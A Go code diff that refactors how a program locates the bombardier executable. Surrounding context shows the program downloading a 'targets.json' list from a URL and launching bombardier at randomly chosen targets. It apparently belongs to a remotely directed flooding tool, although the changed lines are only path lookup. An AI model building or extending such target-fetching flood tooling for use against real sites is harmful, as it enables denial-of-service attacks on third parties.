@@ -15,6 +15,7 @@ import (
 	"syscall"
 )
 
+// Download and parse targets.json
 func loadConfigs(url string) ([]string, error) {
 	httpClient := http.Client {
 		Timeout: time.Second * 1,
@@ -53,12 +54,8 @@ func randomItem(items []string) string {
     return items[randomIndex]
 }
 
-func bombardierExecutable() string {
-	currentFolder, err := os.Getwd()
-	if err != nil {
-        log.Fatal(err)
-    }
-
+// Get possible path to bombardier in cwd/bin/platform folder
+func bombardierExecutablePathInBin(currentFolder string) string {
 	var result string = ""
     switch runtime.GOOS {
     case "windows":
@@ -74,6 +71,41 @@ func bombardierExecutable() string {
 	return result
 }
 
+// Get possible path to bombardier in cwd folder
+func bombardierExecutablePath(currentFolder string) string {
+	var result string = ""
+    switch runtime.GOOS {
+    case "windows":
+        result = path.Join(currentFolder, "bombardier.exe")
+    case "darwin":
+        result = path.Join(currentFolder, "bombardier")
+    case "linux":
+        result = path.Join(currentFolder, "bombardier")
+    default:
+        log.Fatal("Unsupported OS: ", runtime.GOOS)
+    }
+
+	return result
+}
+
+// Get path to bombandier or fail
+func bombardierExecutable() string {
+	currentFolder, err := os.Getwd()
+	if err != nil {
+        log.Fatal(err)
+    }
+
+	if _, err := os.Stat(bombardierExecutablePath(currentFolder)); err == nil {
+		return bombardierExecutablePath(currentFolder)
+	} else if _, err := os.Stat(bombardierExecutablePathInBin(currentFolder)); err == nil {
+		return bombardierExecutablePathInBin(currentFolder)
+	} else {
+		log.Fatal("Unable to find bombardier in: ", currentFolder)
+		return ""
+	}
+}
+
+// Launch process, pipe stdout/err and establish timeout
 func launchWithTimeout(timeout time.Duration, binary string, arguments ...string) error {
 	cmd := exec.Command(binary, arguments...)
 
